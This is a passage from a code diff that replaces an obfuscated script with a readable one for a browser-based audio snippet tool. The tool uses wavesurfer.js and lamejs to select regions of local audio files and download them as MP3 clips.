_0x2a21b1=Math[_0x3505eb('0xc4')](-0x1,Math[_0x500d84('0x84')](0x1,_0x50f9f7[_0x3f7125]));_0x58afef['setInt16'](_0x394ba0,_0x2a21b1<0x0?_0x2a21b1*0x8000:_0x2a21b1*0x7fff,!![]);}}function _0x43c87c(_0x538fa5,_0x4d1bb0,_0x5a3cde){const _0x21dbee=_0x53f502,_0x19b410=_0x53f502,_0x26fed0=_0x34eabb;for(let _0x15f528=0x0;_0x15f528<_0x5a3cde[_0x21dbee('0xd8')];_0x15f528++){_0x538fa5[_0x19b410('0xd7')](_0x4d1bb0+_0x15f528,_0x5a3cde[_0x21dbee('0xe7')](_0x15f528));}}return _0x4f5158(_0x455a7b);}}document['getElementById']('snippetBtn')[_0x3a5c1f('0x95')]('click',async()=>{const _0x27280e=_0x3a5c1f,_0x57eba6=_0x4afc55,_0x18396c=_0x52cef1,_0x356313=_0x52cef1;if(!currentFile||!activeRegion)return;try{const _0x458242=await createSnippetWithFallback(currentFile,activeRegion);if(!_0x458242){alert(_0x27280e('0xa7'));return;}const _0x294fbe=URL[_0x27280e('0xed')](_0x458242),_0x1d4ada=currentFile['name']['replace'](/\.[^/.]+$/,''),_0x12568b=document[_0x57eba6('0xca')]('a');_0x12568b[_0x18396c('0xef')]=_0x294fbe,_0x12568b[_0x356313('0xec')]=_0x1d4ada+_0x57eba6('0xee'),_0x12568b['click'](),URL['revokeObjectURL'](_0x294fbe);}catch(_0x537c6c){console[_0x356313('0x89')](_0x57eba6('0xa6'),_0x537c6c),alert(_0x18396c('0xba'));}}),document[_0x3a5c1f('0xb0')](_0x3a5c1f('0xb6'))['addEventListener']('click',()=>{const _0x886ba7=_0x52cef1;wavesurfer[_0x886ba7('0xe5')]();}),document[_0x3f7f04('0xb0')]('pauseBtn')[_0x52cef1('0x95')]('click',()=>{const _0x28d2f5=_0x3a5c1f;wavesurfer[_0x28d2f5('0xd1')]();}),document[_0x3f7f04('0xb0')](_0x3a5c1f('0x85'))['addEventListener'](_0x4afc55('0xd3'),()=>{const _0x454f26=_0x3f7f04,_0x151c65=_0x3f7f04,_0x1ded01=_0x3a5c1f,_0x46f584=_0x52cef1;if(!activeRegion)return;wavesurfer[_0x454f26('0x7a')](activeRegion[_0x151c65('0x8b')]/wavesurfer[_0x151c65('0xa9')]()),wavesurfer['play']();const _0x486574=(activeRegion[_0x454f26('0xc0')]-activeRegion[_0x1ded01('0x8b')])*0x3e8;setTimeout(()=>{const _0x285f7c=_0x151c65;wavesurfer[_0x285f7c('0xd1')]();},_0x486574);}),wavesurfer['on'](_0x3f7f04('0xe5'),()=>{const _0x230408=_0x3a5c1f,_0x416910=_0x52cef1,_0x7fcce9=_0x4afc55,_0x5f38e4=_0x3a5c1f;document['getElementById'](_0x230408('0xb6'))[_0x416910('0xc8')][_0x7fcce9('0x91')]=_0x5f38e4('0x9a'),document[_0x5f38e4('0xb0')](_0x7fcce9('0x7b'))[_0x7fcce9('0xc8')]['background']=_0x416910('0x8d');}),wavesurfer['on'](_0x52cef1('0xd1'),()=>{const _0x155f18=_0x3a5c1f,_0x448a6b=_0x3f7f04,_0x16ffd3=_0x52cef1,_0x3478c5=_0x52cef1;document[_0x155f18('0xb0')](_0x155f18('0xb6'))['style'][_0x16ffd3('0x91')]=_0x3478c5('0x8d'),document[_0x3478c5('0xb0')](_0x16ffd3('0x7b'))[_0x16ffd3('0xc8')]['background']=_0x448a6b('0x8d');}),wavesurfer['on'](_0x3f7f04('0x99'),()=>{const _0xbd4d43=_0x4afc55,_0x5487b9=_0x4afc55,_0x5d0a23=_0x52cef1,_0x4d48b1=_0x52cef1;document[_0xbd4d43('0xb0')]('playBtn')['style'][_0xbd4d43('0x91')]='#00ff88',document[_0x5d0a23('0xb0')](_0x4d48b1('0x7b'))[_0x4d48b1('0xc8')][_0x5d0a23('0x91')]='#00ff88';});
-</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/wavesurfer.js/6.6.3/wavesurfer.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/wavesurfer.js/6.6.3/plugin/wavesurfer.regions.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/lamejs/1.2.0/lame.min.js"></script>
+    
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        let wavesurfer = WaveSurfer.create({
+            container: '#waveform',
+            waveColor: '#00ff88',
+            progressColor: '#00ccff', 
+            cursorColor: '#fff',
+            barWidth: 2,
+            barRadius: 3,
+            cursorWidth: 1,
+            height: 200,
+            barGap: 3,
+            plugins: [WaveSurfer.regions.create()]
+        });
+
+        let activeRegion = null;
+        let currentFile = null;
+        let audioFiles = [];
+        let currentFileIndex = 0;
+        let fileRegions = new Map();
+
+        document.querySelector('#fileInput').addEventListener('change', async function(event) {
+            const files = Array.from(event.target.files);
+            audioFiles = files;
+            fileRegions.clear();
+            updateFileList();
+
+            if (files.length > 0) {
+                loadFile(0);
+            }
+        });
+
+        function updateFileList() {
+            const fileList = document.querySelector('#fileList');
+            fileList.innerHTML = '';
+            audioFiles.forEach((file, index) => {
+                const div = document.createElement('div');
+                div.className = 'file-item';
+                div.innerHTML = `
+                    <span>${file.name}</span>
+                    <button onclick="loadFile(${index})">Load</button>
+                `;
+                fileList.appendChild(div);
+            });
+        }
+
+        function loadFile(index) {
+            currentFileIndex = index;
+            currentFile = audioFiles[index];
+            wavesurfer.clearRegions();
+
+            const objectUrl = URL.createObjectURL(currentFile);
+            wavesurfer.load(objectUrl);
+
+            wavesurfer.on('ready', function() {
+                const savedRegion = fileRegions.get(index);
+                if (savedRegion) {
+                    activeRegion = wavesurfer.addRegion({
+                        start: savedRegion.start,
+                        end: savedRegion.end,
+                        color: 'rgba(0, 255, 136, 0.2)'
+                    });
+                } else {
+                    activeRegion = wavesurfer.addRegion({
+                        start: 0,
+                        end: wavesurfer.getDuration(),
+                        color: 'rgba(0, 255, 136, 0.2)'
+                    });
+                }
+                updateRegionDisplay();
+            });
+        }
+
+        wavesurfer.on('ready', function() {
+            wavesurfer.clearRegions();
+            activeRegion = wavesurfer.addRegion({
+                start: 0,
+                end: wavesurfer.getDuration(),
+                color: 'rgba(0, 255, 136, 0.2)'
+            });
+            updateRegionDisplay();
+        });
+
+        wavesurfer.on('region-update-end', function(region) {
+            activeRegion = region;
+            fileRegions.set(currentFileIndex, {
+                start: region.start,
+                end: region.end
+            });
+            updateRegionDisplay();
+        });
+
+        wavesurfer.on('region-removed', function() {
+            if (activeRegion) {
+                activeRegion = null;
+                document.querySelector('#regionTime').textContent = 'No selection';
+            }
+        });
+
+        function updateRegionDisplay() {
+            if (activeRegion) {
+                const start = formatTime(activeRegion.start);
+                const end = formatTime(activeRegion.end);
+                document.querySelector('#regionTime').textContent = `${start} - ${end}`;
+                document.querySelector('#startTime').value = start;
+                document.querySelector('#endTime').value = end;
+            }
+        }
+
+        document.querySelector('#playBtn').addEventListener('click', () => {
+            wavesurfer.play();
+        });
+
+        document.querySelector('#pauseBtn').addEventListener('click', () => {
+            wavesurfer.pause();
+        });
+
+        document.querySelector('#playRegionBtn').addEventListener('click', () => {
+            if (activeRegion) {
+                activeRegion.play();
+            }
+        });
+
+        function formatTime(time) {
+            const minutes = Math.floor(time / 60);
+            const seconds = Math.floor(time % 60);
+            const milliseconds = Math.floor((time % 1) * 1000);
+            return `${minutes}:${seconds.toString().padStart(2, '0')}.${milliseconds.toString().padStart(3, '0')}`;
+        }
+
+        function parseTimeInput(timeString) {
+            const parts = timeString.split(':');
+            let minutes = 0;
+            let seconds = 0;
+            let milliseconds = 0;
+
+            if (parts.length === 2) {
+                const [min, secMs] = parts;
+                minutes = parseInt(min);
+                const [sec, ms] = secMs.split('.');
+                seconds = parseInt(sec);
+                milliseconds = parseInt(ms || 0);
+            }
+
+            return minutes * 60 + seconds + milliseconds / 1000;
+        }
+
+        async function createSnippet(file, region) {
+            if (!wavesurfer.backend.buffer || !region) return;
+
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const buffer = wavesurfer.backend.buffer;
+            const startOffset = Math.floor(region.start * buffer.sampleRate);
+            const endOffset = Math.floor(region.end * buffer.sampleRate);
+            const numberOfChannels = buffer.numberOfChannels;
+            
+            const snippetBuffer = audioContext.createBuffer(
+                numberOfChannels,
+                endOffset - startOffset,
+                buffer.sampleRate
+            );
+
+            // Copy the selected portion of audio
+            for (let channel = 0; channel < numberOfChannels; channel++) {
+                const channelData = buffer.getChannelData(channel);
+                const snippetData = snippetBuffer.getChannelData(channel);
+                for (let i = 0; i < snippetBuffer.length; i++) {
+                    snippetData[i] = channelData[startOffset + i];
+                }
+            }
+
+            // Convert to MP3
+            const mp3Encoder = new lamejs.Mp3Encoder(1, snippetBuffer.sampleRate, 128);
+            const samples = new Int16Array(snippetBuffer.length);
+            const leftChannel = snippetBuffer.getChannelData(0);
+
+            if (numberOfChannels === 2) {
+                const rightChannel = snippetBuffer.getChannelData(1);
+                for (let i = 0; i < snippetBuffer.length; i++) {
+                    samples[i] = ((leftChannel[i] + rightChannel[i]) / 2) * 0x7FFF;
+                }
+            } else {
+                for (let i = 0; i < snippetBuffer.length; i++) {
+                    samples[i] = leftChannel[i] * 0x7FFF;
+                }
+            }
+
+            const mp3Data = [];
+            const sampleBlockSize = 1152;
+            
+            for (let i = 0; i < samples.length; i += sampleBlockSize) {
+                const sampleChunk = samples.slice(i, i + sampleBlockSize);
+                const mp3buf = mp3Encoder.encodeBuffer(sampleChunk);
+                if (mp3buf.length > 0) {
+                    mp3Data.push(new Int8Array(mp3buf));
+                }
+            }
+
+            const mp3Final = mp3Encoder.flush();
+            if (mp3Final.length > 0) {
+                mp3Data.push(new Int8Array(mp3Final));
+            }
+
+            return new Blob(mp3Data, { type: 'audio/mp3' });
+        }
+
+        document.querySelector('#snippetBtn').addEventListener('click', async () => {
+            if (!currentFile || !activeRegion) return;
+
+            const blob = await createSnippet(currentFile, activeRegion);
+            const url = URL.createObjectURL(blob);
+            const filename = currentFile.name.replace(/\.[^/.]+$/, '');
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = filename + '_snippet.mp3';
+            link.click();
+            URL.revokeObjectURL(url);
+        });
+
+        document.querySelector('#massSnippetBtn').addEventListener('click', async () => {
+            for (let i = 0; i < audioFiles.length; i++) {
+                loadFile(i);
+                await new Promise(resolve => {
+                    wavesurfer.on('ready', async () => {
+                        const blob = await createSnippet(audioFiles[i], activeRegion);
+                        const url = URL.createObjectURL(blob);
+                        const filename = audioFiles[i].name.replace(/\.[^/.]+$/, '');
+                        const link = document.createElement('a');
+                        link.href = url;
+                        link.download = filename + '_snippet.mp3';
+                        link.click();
+                        URL.revokeObjectURL(url);
+                        resolve();
+                    });
+                });
+            }
+        });
+
+        document.querySelector('#applyTimeBtn').addEventListener('click', () => {
+            const startTimeInput = document.querySelector('#startTime').value;
+            const endTimeInput = document.querySelector('#endTime').value;
+
+            if (!startTimeInput || !endTimeInput) {
+                alert('Please enter both start and end times');
+                return;
+            }
+
+            const start = parseTimeInput(startTimeInput);
+            const end = parseTimeInput(endTimeInput);
+
+            if (start >= end) {
+                alert('Start time must be less than end time');
+                return;
+            }
+
+            if (end > wavesurfer.getDuration()) {
+                alert('End time cannot exceed audio duration');
+                return;
+            }
+
+            // Remove existing region
+            wavesurfer.clearRegions();
+
+            // Create new region with manual times
+            activeRegion = wavesurfer.addRegion({
+                start: start,
+                end: end,
+                color: 'rgba(0, 255, 136, 0.2)'
+            });
+
+            fileRegions.set(currentFileIndex, {
+                start: start,
+                end: end
+            });
+
+            updateRegionDisplay();
+        });
+    });
+    </script>
 </body></html>
